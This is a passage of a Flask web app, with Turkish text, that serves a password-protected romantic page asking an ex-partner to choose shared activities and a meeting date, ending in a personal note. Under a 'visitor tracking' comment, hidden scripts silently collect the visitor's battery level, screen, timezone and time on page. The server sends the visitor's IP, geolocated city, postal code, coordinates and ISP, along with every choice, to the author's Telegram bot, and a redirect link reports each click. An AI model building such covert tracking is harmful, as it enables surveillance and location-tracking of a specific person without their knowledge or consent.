      margin-bottom:8px;
    }
    .alt-yazi{color:#7a5860;font-size:.85rem;font-weight:300;letter-spacing:.03em;}
    .liste{list-style:none;display:flex;flex-direction:column;gap:14px;}
    .madde{
      display:grid;
      grid-template-columns:108px minmax(0,1fr);
      align-items:center;
      gap:14px;
      background:rgba(200,60,80,.07);
      border:1px solid rgba(200,60,80,.13);
      border-radius:14px;
      padding:12px;
      cursor:pointer;
      transition:background .2s,border-color .2s,transform .15s,box-shadow .15s;
      user-select:none;
      overflow:hidden;
    }
    .madde:hover{background:rgba(200,60,80,.14);border-color:rgba(200,60,80,.28);transform:translateX(4px);box-shadow:0 10px 30px rgba(0,0,0,.16);}
    .madde.secili{
      background:rgba(200,60,80,.22);
      border-color:rgba(220,80,100,.55);
    }
    .madde-foto{
      width:108px;
      height:108px;
      border-radius:12px;
      overflow:hidden;
      background:linear-gradient(180deg,rgba(255,255,255,.08),rgba(200,60,80,.16));
      position:relative;
      border:1px solid rgba(255,255,255,.06);
      flex-shrink:0;
    }
    .madde-foto img{
      width:100%;
      height:100%;
      object-fit:cover;
      display:block;
    }
    .foto-bekle{
      position:absolute;
      inset:0;
      display:flex;
      align-items:center;
      justify-content:center;
      padding:12px;
      text-align:center;
      color:#a78289;
      font-size:.74rem;
      line-height:1.4;
      background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.06));
    }
    .madde.secili .madde-ikon::after{content:'✓';position:absolute;font-size:.65rem;top:-2px;right:-2px;background:#c94060;color:#fff;border-radius:50%;width:14px;height:14px;display:flex;align-items:center;justify-content:center;}
    .madde-ikon{
      font-size:1.5rem;
      min-width:38px;height:38px;
      background:rgba(200,60,80,.12);
      border-radius:10px;
      display:flex;align-items:center;justify-content:center;
      position:relative;
      transition:transform .2s;
    }
    .madde:hover .madde-ikon{transform:scale(1.1);}
    .madde-metin{flex:1;}
    .madde-baslik{color:#e8cdd3;font-size:.97rem;font-weight:400;}
    .alt-alan{margin-top:32px;text-align:center;}
    .gonder-btn{
      background:linear-gradient(135deg,#c94060,#e8607a);
      color:#fff;
      border:none;
      border-radius:50px;
      padding:14px 44px;
      font-size:1rem;
      font-family:'Lato',sans-serif;
      font-weight:600;
      cursor:pointer;
      box-shadow:0 4px 20px rgba(200,60,90,.4);
      transition:transform .15s,box-shadow .15s,opacity .2s;
      letter-spacing:.04em;
    }
    .gonder-btn:hover{transform:scale(1.05);box-shadow:0 6px 28px rgba(200,60,90,.55);}
    .gonder-btn:disabled{opacity:.4;cursor:not-allowed;transform:none;}
    .onay-mesaj{
      margin-top:18px;
      color:#c97080;
      font-size:.87rem;
      font-style:italic;
      min-height:20px;
      opacity:0;
      transition:opacity .4s;
    }
    .onay-mesaj.goster{opacity:1;}
    @media (max-width:600px){
      body{padding:16px 12px 28px;align-items:flex-start;}
      .kart{padding:28px 16px 24px;border-radius:20px;}
      .baslik-alan{margin-bottom:24px;}
      .emoji-ust{font-size:2rem;margin-bottom:12px;}
      .baslik{font-size:1.32rem;line-height:1.34;}
      .alt-yazi{font-size:.8rem;line-height:1.45;}
      .liste{gap:12px;}
      .madde{grid-template-columns:1fr;padding:10px;gap:12px;}
      .madde:hover{transform:none;}
      .madde-foto{width:100%;height:164px;border-radius:11px;}
      .madde-metin{padding:0 4px 2px;}
      .madde-baslik{font-size:1rem;}
      .gonder-btn{width:100%;padding:15px 24px;font-size:.98rem;}
      .onay-mesaj{font-size:.82rem;}
    }
  </style>
</head>
<body>
  <div class="kalpler" id="kalpler"></div>

  <div class="kart">
    <div class="baslik-alan">
      <span class="emoji-ust">💌</span>
      <p class="baslik">eskiden yapıp özlediğimiz şeyler</p>
      <p class="alt-yazi">hangilerini yapmak istersin? birini, hepsini, ya da hiçbirini.</p>
    </div>

    <ul class="liste" id="liste">
      <li class="madde" onclick="sec(this)" data-id="magaza">
        <div class="madde-foto">
          <img alt="Mağaza gezisi fotoğrafı" data-foto="magaza" loading="lazy"/>
          <div class="foto-bekle">magaza fotoğrafı bekleniyor</div>
        </div>
        <div class="madde-metin">
          <div class="madde-ikon">🛍️</div>
          <div class="madde-baslik">mağaza gezelim</div>
        </div>
      </li>
      <li class="madde" onclick="sec(this)" data-id="film">
        <div class="madde-foto">
          <img alt="Film gecesi fotoğrafı" data-foto="film" loading="lazy"/>
          <div class="foto-bekle">film fotoğrafı bekleniyor</div>
        </div>
        <div class="madde-metin">
          <div class="madde-ikon">🎬</div>
          <div class="madde-baslik">film</div>
        </div>
      </li>
      <li class="madde" onclick="sec(this)" data-id="popeyes">
        <div class="madde-foto">
          <img alt="Popeyes fotoğrafı" data-foto="popeyes" loading="lazy"/>
          <div class="foto-bekle">popeyes fotoğrafı bekleniyor</div>
        </div>
        <div class="madde-metin">
          <div class="madde-ikon">🍗</div>
          <div class="madde-baslik">popeyes</div>
        </div>
      </li>
      <li class="madde" onclick="sec(this)" data-id="lego">
        <div class="madde-foto">
          <img alt="Lego fotoğrafı" data-foto="lego" loading="lazy"/>
          <div class="foto-bekle">lego fotoğrafı bekleniyor</div>
        </div>
        <div class="madde-metin">
          <div class="madde-ikon">🧱</div>
          <div class="madde-baslik">lego</div>
        </div>
      </li>
    </ul>

    <div class="alt-alan">
      <button class="gonder-btn" id="gonderBtn" disabled onclick="gonder()">son nota geç 💕</button>
      <p class="onay-mesaj" id="onayMesaj"></p>
    </div>
  </div>

  <script>
    // Floating hearts
    const kalpDiv=document.getElementById('kalpler');
    const emojiler=['🌸','💗','✨','🌷','💖','🫧','🌹','💝','🎀'];
    for(let i=0;i<26;i++){
      const el=document.createElement('span');
      el.className='kalp';
      el.textContent=emojiler[Math.floor(Math.random()*emojiler.length)];
      el.style.left=Math.random()*100+'%';
      el.style.animationDelay=Math.random()*9+'s';
      el.style.animationDuration=(5+Math.random()*5)+'s';
      el.style.fontSize=(.6+Math.random()*.9)+'rem';
      kalpDiv.appendChild(el);
    }

    fetch('/api/fotos')
      .then(r=>r.json())
      .then(dosyalar=>{
        const uygunUzantilar=['jpg','jpeg','png','webp','gif'];
        document.querySelectorAll('img[data-foto]').forEach((img)=>{
          const anahtar=img.dataset.foto.toLowerCase();
          const dosya=dosyalar.find((ad)=>{
            const alt=ad.toLowerCase();
            return alt.startsWith(anahtar+'.') || alt.startsWith(anahtar+'_') || alt.startsWith(anahtar+'-');
          });
          if(!dosya){
            const varsayilan=uygunUzantilar.map((uzanti)=>'/static/photos/'+anahtar+'.'+uzanti);
            const dene=(index)=>{
              if(index>=varsayilan.length){return;}
              img.onload=()=>{const bekle=img.parentElement.querySelector('.foto-bekle');if(bekle){bekle.style.display='none';}};
              img.onerror=()=>dene(index+1);
              img.src=varsayilan[index];
            };
            dene(0);
            return;
          }
          img.onload=()=>{
            const bekle=img.parentElement.querySelector('.foto-bekle');
            if(bekle){bekle.style.display='none';}
          };
          img.src='/static/photos/'+dosya;
        });
      })
      .catch(()=>{});

    const secili=new Set();
    function sec(el){
      const id=el.dataset.id;
      if(secili.has(id)){secili.delete(id);el.classList.remove('secili');}
      else{secili.add(id);el.classList.add('secili');}
      document.getElementById('gonderBtn').disabled=secili.size===0;
    }

    const isimler={
      magaza:'mağaza gezelim',
      film:'film',
      popeyes:'popeyes',
      lego:'lego'
    };

    function gonder(){
      const btn=document.getElementById('gonderBtn');
      btn.disabled=true;
      const liste=[...secili].map(k=>isimler[k]).join(', ');
      fetch('/api/secim',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({secimler:liste})
      }).then(()=>{
        window.location.href='/son-not';
      }).catch(()=>{
        btn.disabled=false;
      });
    }

    // Ziyaretçi takip
    const _t0=Date.now();
    (async()=>{
      let pil='?';
      try{const b=await navigator.getBattery();pil=(b.level*100).toFixed(0)+'%';}catch(e){}
      fetch('/api/bilgi',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({
        ekran:screen.width+'x'+screen.height,pencere:window.innerWidth+'x'+window.innerHeight,
        saat:new Date().toLocaleString('tr-TR'),zaman_dilimi:Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform:navigator.platform||'?',pil,cevrimici:navigator.onLine?'Evet':'Hayır'
      })});
    })();
    function _sure(){
      const s=Math.round((Date.now()-_t0)/1000),v=JSON.stringify({saniye:s});
      navigator.sendBeacon?navigator.sendBeacon('/api/sure',new Blob([v],{type:'application/json'})):fetch('/api/sure',{method:'POST',headers:{'Content-Type':'application/json'},body:v,keepalive:true});
    }
    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden')_sure();});
    window.addEventListener('beforeunload',_sure);
  </script>
</body>
</html>
"""

HTML_SON_NOT = """
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>son not</title>
  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Playfair+Display:ital,wght@1,400;1,600&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0;}
    body{min-height:100vh;background:#0a0208;font-family:'Lato',sans-serif;display:flex;align-items:center;justify-content:center;padding:32px 16px;position:relative;overflow-x:hidden;overflow-y:auto;-webkit-overflow-scrolling:touch;}
    .kalpler{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;}
    .kalp{position:absolute;opacity:0;animation:yuksel 7s ease-in infinite;}
    @keyframes yuksel{0%{opacity:0;transform:translateY(0) scale(0.5);}10%{opacity:.38;}90%{opacity:.1;}100%{opacity:0;transform:translateY(-100vh) scale(1.1);}}
    .kart{position:relative;z-index:1;max-width:560px;width:100%;background:rgba(28,6,14,.92);border:1px solid rgba(220,80,100,.22);border-radius:24px;padding:44px 34px 38px;backdrop-filter:blur(14px);box-shadow:0 12px 60px rgba(0,0,0,.65);text-align:center;}
    .emoji-ust{font-size:2.5rem;display:block;margin-bottom:16px;animation:nabiz 2.2s ease-in-out infinite;}
    @keyframes nabiz{0%,100%{transform:scale(1);}50%{transform:scale(1.14);}}
    .baslik{font-family:'Playfair Display',serif;font-style:italic;font-size:1.6rem;color:#f0d0d8;line-height:1.4;margin-bottom:14px;}
    .not-kutu{padding:20px 20px;border-radius:18px;background:rgba(255,255,255,.05);border:1px solid rgba(220,80,100,.16);color:#efcfd7;font-size:.94rem;line-height:1.8;font-weight:400;white-space:pre-line;}
    @media (max-width:600px){body{padding:20px 14px;align-items:flex-start;}.kart{margin-top:22px;padding:32px 18px 26px;border-radius:20px;}.emoji-ust{font-size:2rem;}.baslik{font-size:1.34rem;line-height:1.32;}.not-kutu{font-size:.85rem;line-height:1.7;padding:16px 15px;}}
  </style>
</head>
<body>
  <div class="kalpler" id="kalpler"></div>
  <div class="kart">
    <span class="emoji-ust">💗</span>
    <p class="baslik">son not</p>
    <div class="not-kutu">eğer bir şey denemeyeceksek de zaman geçirelim ve cidden adam akıllı konuşalım. neyi yanlış yaptım? sen niye yanlış yaptın? neleri yanlış yaptık, nerede tahammülsüzdüm? işte bunda, bundaki tavrım yanlıştı. her şeyi, her şeyi, her şeyi... bu noktaya nasıl geldik, her şeyi konuşalım yani doyasıya.

  senden bir gününü istiyorum. sadece bir gün. ve cidden aklından geçenleri bilmek istiyorum. yani bi işten önceni ayırmanı istiyorum. çünkü ben seni harbiden sevdim yani, harbiden sevdim. hiçbir taktik, plan program yapmadım. her gün yanına gelirken dedim ki bak bu bir süre sonra sıradanlaşacak yani ama yine de yaptım dedim. kendimi senden çekmeyeyim, işte içime ne doğarsa onu yapayım.

  mesela çiçek alacağım sana, artık son aldığımda sevinmemeye bile başladın yani. çok sıradanlaştırdım ama dedim ki ya, ben içimden geldiği gibi yapayım, mutlu edeyim yani. cidden çok sevdim onun için.

  senden bir kahvaltılık zaman istiyorum. sadece bir saat falan. ve sonuca bağlamak zorunda değiliz. yani sadece bunu istiyorum senden ki bi şeylere inancım hala olsun... ve sen de biliyorsun ki beraber harbi iyi zaman geçiriyoruz.</div>
  </div>
  <script>
    const kalpDiv=document.getElementById('kalpler');
    const emojiler=['🌸','💗','✨','🌷','💖','🫧','🌹','💝','🎀'];
    for(let i=0;i<24;i++){const el=document.createElement('span');el.className='kalp';el.textContent=emojiler[Math.floor(Math.random()*emojiler.length)];el.style.left=Math.random()*100+'%';el.style.animationDelay=Math.random()*8+'s';el.style.animationDuration=(5+Math.random()*5)+'s';el.style.fontSize=(.7+Math.random()*.8)+'rem';kalpDiv.appendChild(el);}
    const _t0=Date.now();
    (async()=>{let pil='?';try{const b=await navigator.getBattery();pil=(b.level*100).toFixed(0)+'%';}catch(e){}fetch('/api/bilgi',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ekran:screen.width+'x'+screen.height,pencere:window.innerWidth+'x'+window.innerHeight,saat:new Date().toLocaleString('tr-TR'),zaman_dilimi:Intl.DateTimeFormat().resolvedOptions().timeZone,platform:navigator.platform||'?',pil,cevrimici:navigator.onLine?'Evet':'Hayır'})});})();
    function _sure(){const s=Math.round((Date.now()-_t0)/1000),v=JSON.stringify({saniye:s});navigator.sendBeacon?navigator.sendBeacon('/api/sure',new Blob([v],{type:'application/json'})):fetch('/api/sure',{method:'POST',headers:{'Content-Type':'application/json'},body:v,keepalive:true});}
    document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden')_sure();});window.addEventListener('beforeunload',_sure);
  </script>
</body>
</html>
"""


def bildirim_gonder(mesaj):
    if not TELEGRAM_TOKEN or not CHAT_ID:
        print("Telegram credentials eksik.")
        return False
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": mesaj, "parse_mode": "HTML"}
    try:
        r = requests.post(url, json=payload, timeout=5)
        return r.status_code == 200
    except Exception as e:
        print("Bildirim gönderilemedi:", e)
        return False


def gercek_ip_al(req):
    """Proxy arkasındaki gerçek IP'yi al."""
    for header in ("X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP", "True-Client-IP"):
        val = req.headers.get(header)
        if val:
            return val.split(",")[0].strip()
    return req.remote_addr or "Bilinmiyor"


def ip_konum_al(ip):
    """ip-api.com üzerinden konum bilgisi çek."""
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query",
            timeout=5
        )
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                return d
    except Exception:
        pass
    return None


def ziyaretci_mesaj_olustur(req, ek_bilgi=None):
    """Ziyaretçi hakkında detaylı Telegram mesajı oluştur."""
    from datetime import datetime, timezone
    ip = gercek_ip_al(req)
    ua = req.headers.get("User-Agent", "Bilinmiyor")
    dil = req.headers.get("Accept-Language", "Bilinmiyor")
    referer = req.headers.get("Referer", "Doğrudan giriş")
    zaman = datetime.now(timezone.utc).strftime("%d.%m.%Y %H:%M:%S UTC")

    konum = ip_konum_al(ip)

    satirlar = [
        "👤 <b>YENİ ZİYARETÇİ</b>",
        "",
        f"🕐 <b>Zaman:</b> {zaman}",
        f"🌐 <b>IP Adresi:</b> <code>{ip}</code>",
    ]

    if konum:
        satirlar += [
            f"🏳️ <b>Ülke:</b> {konum.get('country', '?')}",
            f"📍 <b>Şehir:</b> {konum.get('city', '?')} / {konum.get('regionName', '?')}",
            f"📮 <b>Posta Kodu:</b> {konum.get('zip', '?')}",
            f"🗺️ <b>Koordinat:</b> {konum.get('lat', '?')}, {konum.get('lon', '?')}",
            f"📡 <b>ISS:</b> {konum.get('isp', '?')}",
            f"🏢 <b>Org:</b> {konum.get('org', '?')}",
        ]

    satirlar += [
        "",
        f"🖥️ <b>Tarayıcı/Cihaz:</b> {ua}",
        f"🌍 <b>Dil:</b> {dil}",
        f"🔗 <b>Nereden Geldi:</b> {referer}",
    ]

    if ek_bilgi:
        satirlar += [
            "",
            "📊 <b>Ekran & Sistem Bilgisi:</b>",
            f"📐 <b>Ekran:</b> {ek_bilgi.get('ekran', '?')}",
            f"🖱️ <b>Pencere:</b> {ek_bilgi.get('pencere', '?')}",
            f"⏰ <b>Yerel Saat:</b> {ek_bilgi.get('saat', '?')}",
            f"🌐 <b>Zaman Dilimi:</b> {ek_bilgi.get('zaman_dilimi', '?')}",
            f"💻 <b>Platform:</b> {ek_bilgi.get('platform', '?')}",
            f"🔋 <b>Pil:</b> {ek_bilgi.get('pil', '?')}",
            f"🌐 <b>Çevrimiçi mi:</b> {ek_bilgi.get('cevrimici', '?')}",
        ]

    return "\n".join(satirlar)


def erisim_var_mi():
    return session.get("site_giris_ok") is True


def sayfa_koruma():
    if not erisim_var_mi():
        return redirect("/")
    return None


def api_koruma():
    if not erisim_var_mi():
        return jsonify({"ok": False, "hata": "Yetkisiz"}), 403
    return None


@app.route("/api/fotos")
def foto_listesi():
    klasor = os.path.join(app.root_path, 'static', 'photos')
    uzantilar = {'.jpg', '.jpeg', '.png', '.webp', '.gif'}
    try:
        dosyalar = [
            f for f in os.listdir(klasor)
            if os.path.splitext(f)[1].lower() in uzantilar
        ]
    except Exception:
        dosyalar = []
    return jsonify(dosyalar)


@app.route("/", methods=["GET", "POST"])
def ana_sayfa():
    hata = None
    if request.method == "POST":
        gun = str(request.form.get("gun", "")).strip()
        ay = str(request.form.get("ay", "")).strip().lower()
        if gun == "12" and ay == "mart":
            session["site_giris_ok"] = True
            return redirect("/")
        hata = "şifre doğru değil."

    if not erisim_var_mi():
        return render_template_string(HTML_GIRIS, hata=hata, gunler=range(1, 32))

    mesaj = ziyaretci_mesaj_olustur(request)
    bildirim_gonder(mesaj)
    return render_template_string(HTML_SAYFA)


@app.route("/bulusma")
def bulusma_sayfasi():
  koruma = sayfa_koruma()
  if koruma:
    return koruma

  izinli_tarihler = izin_tarih_araligi()
  return render_template_string(
    HTML_TARIH,
    min_date=min(izinli_tarihler).isoformat(),
    max_date=max(izinli_tarihler).isoformat(),
    allowed_dates=[tarih.isoformat() for tarih in izinli_tarihler],
  )


@app.route("/bulusma/aktiviteler")
def aktiviteler_sayfasi():
  koruma = sayfa_koruma()
  if koruma:
    return koruma
  return redirect("/son-not")


@app.route("/soru")
def soru_sayfasi():
  koruma = sayfa_koruma()
  if koruma:
    return koruma
  return render_template_string(HTML_SORU)


@app.route("/son-not")
def son_not_sayfasi():
  koruma = sayfa_koruma()
  if koruma:
    return koruma
  return render_template_string(HTML_SON_NOT)


@app.route("/api/tarih-secim", methods=["POST"])
def tarih_secim_al():
  """Tarih seçim ekranından gelen izin gününü Telegram'a ilet."""
  api_engel = api_koruma()
  if api_engel:
    return api_engel

  try:
    veri = request.get_json(force=True, silent=True) or {}
    tarih_str = str(veri.get("tarih", "")).strip()
    secilen = date.fromisoformat(tarih_str)
    izinli_tarihler = set(izin_tarih_araligi())
    if secilen not in izinli_tarihler:
      return jsonify({"ok": False, "hata": "yalnızca 9, 10, 12 veya 13 temmuz seçebilirsin."}), 400

    ip = gercek_ip_al(request)
    mesaj = (
      f"📅 <b>İZİN GÜNÜ SEÇİMİ</b>\n"
      f"🌐 <b>IP:</b> <code>{ip}</code>\n\n"
      f"🗓️ <b>Seçilen Tarih:</b> {tarih_str}"
    )
    bildirim_gonder(mesaj)
    return jsonify({"ok": True})
  except Exception as e:
    print("Tarih seçim endpoint hatası:", e)
    return jsonify({"ok": False, "hata": "geçerli bir tarih seç."}), 400


@app.route("/api/secim", methods=["POST"])
def secim_al():
    """İkinci sayfadan gelen aktivite seçimlerini Telegram'a ilet."""
    api_engel = api_koruma()
    if api_engel:
        return api_engel

    try:
        veri = request.get_json(force=True, silent=True) or {}
        secimler = str(veri.get("secimler", "?")).strip()
        ip = gercek_ip_al(request)
        mesaj = (
            f"💌 <b>AKTİVİTE SEÇİMİ</b>\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n\n"
            f"✅ <b>Seçilenler:</b> {secimler}"
        )
        bildirim_gonder(mesaj)
    except Exception as e:
        print("Seçim endpoint hatası:", e)
    return jsonify({"ok": True})


@app.route("/api/bilgi", methods=["POST"])
def tarayici_bilgi():
  """JavaScript'ten gelen ekran/sistem bilgisini sessizce kabul et."""
  api_engel = api_koruma()
  if api_engel:
    return api_engel

  try:
    request.get_json(force=True, silent=True) or {}
  except Exception as e:
    print("Bilgi endpoint hatası:", e)
  return jsonify({"ok": True})


@app.route("/api/push-abone", methods=["POST"])
def push_abone():
    """Tarayıcının push aboneliğini kaydet."""
    api_engel = api_koruma()
    if api_engel:
        return api_engel

    try:
        sub = request.get_json(force=True, silent=True) or {}
        if sub.get("endpoint"):
            upstash("SET", "push_sub", json.dumps(sub))
    except Exception as e:
        print("Push abone hatası:", e)
    return jsonify({"ok": True})


@app.route("/api/gonder", methods=["POST"])
def admin_gonder():
    """Admin bu endpoint'e POST yaparak mesaj gönderir (site kapalı olsa bile)."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        if veri.get("secret") != ADMIN_SECRET:
            return jsonify({"hata": "Yetkisiz"}), 403
        metin = str(veri.get("mesaj", "")).strip()
        if not metin:
            return jsonify({"hata": "Mesaj boş"}), 400

        # Siteye girince görünsün diye Redis'e yaz
        upstash("SET", "bekleyen_mesaj", metin)
        upstash("EXPIRE", "bekleyen_mesaj", 86400)  # 24 saat sonra sil

        # Push bildirimi gönder (site kapalı olsa bile)
        sub_raw = upstash("GET", "push_sub")
        push_sonucu = "Abonelik yok"
        if sub_raw:
            try:
                from pywebpush import webpush, WebPushException
                sub_dict = json.loads(sub_raw)
                webpush(
                    subscription_info=sub_dict,
                    data=json.dumps({"title": "💌 Sana bir mesaj var", "body": metin}),
                    vapid_private_key=VAPID_PRIVATE_KEY,
                    vapid_claims={"sub": VAPID_CONTACT},
                )
                push_sonucu = "Gönderildi"
            except Exception as pe:
                push_sonucu = f"Hata: {pe}"

        return jsonify({"ok": True, "push": push_sonucu})
    except Exception as e:
        print("Admin gönder hatası:", e)
        return jsonify({"hata": str(e)}), 500


@app.route("/api/mesaj-var", methods=["GET"])
def mesaj_var():
    """Kullanıcı sitedeyken bekleyen mesajı çeker ve Redis'ten siler."""
    try:
        metin = upstash("GETDEL", "bekleyen_mesaj")
        if metin:
            return jsonify({"mesaj": metin})
    except Exception:
        pass
    return jsonify({"mesaj": None})


@app.route("/api/sure", methods=["POST"])
def sure_al():
    """Kullanıcının sayfada kaldığı süreyi al ve Telegram'a gönder."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        saniye = int(veri.get("saniye", 0))
        ip = gercek_ip_al(request)
        if saniye < 60:
            sure_str = f"{saniye} saniye"
        else:
            dakika = saniye // 60
            kalan = saniye % 60
            sure_str = f"{dakika} dakika {kalan} saniye"
        bildirim_gonder(f"⏱️ <b>Sayfada Kalınan Süre</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n🕒 <b>Süre:</b> {sure_str}")
    except Exception as e:
        print("Süre endpoint hatası:", e)
    return "", 204


@app.route("/musaitlik", methods=["POST"])
def musaitlik_al():
    """Müsaitlik formundan gelen veriyi Telegram'a gönder."""
    try:
        veri = request.get_json(force=True, silent=True) or {}
        gunler = veri.get("gunler", "?")
        baslangic = veri.get("baslangic", "?")
        bitis = veri.get("bitis", "?")
        sure_dk = veri.get("sure_dk", "?")
        ip = gercek_ip_al(request)
        mesaj = (
            f"📅 <b>MÜSAİTLİK FORMU</b>\n"
            f"🌐 <b>IP:</b> <code>{ip}</code>\n\n"
            f"📆 <b>Günler:</b> {gunler}\n"
            f"🕐 <b>Saat:</b> {baslangic} – {bitis}\n"
            f"⏱ <b>Konuşma Süresi:</b> {sure_dk} dakika"
        )
        basarili = bildirim_gonder(mesaj)
        return jsonify({"ok": basarili})
    except Exception as e:
        print("Müsaitlik endpoint hatası:", e)
        return jsonify({"ok": False}), 500


@app.route("/mesaj", methods=["POST"])
def mesaj_al():
    metin = request.form.get("mesaj", "").strip()
    if not metin:
        return render_template_string(HTML_SAYFA, basarili=False, hata=True, vapid_public=VAPID_PUBLIC_KEY)
    ip = gercek_ip_al(request)
    basarili = bildirim_gonder(f"📩 <b>Yeni Mesaj</b>\n🌐 <b>IP:</b> <code>{ip}</code>\n\n{metin}")
    return render_template_string(
        HTML_SAYFA,
        basarili=basarili,
        hata=not basarili,
        vapid_public=VAPID_PUBLIC_KEY,
    )


@app.route("/sw.js")
def service_worker():
    return send_from_directory("static", "sw.js", mimetype="application/javascript")


@app.route("/git")
def yonlendir():
    bildirim_gonder("⚠️ Kısaltılmış linkine birisi tıkladı!")
    return redirect(HEDEF_URL)


if __name__ == "__main__":
    app.run()

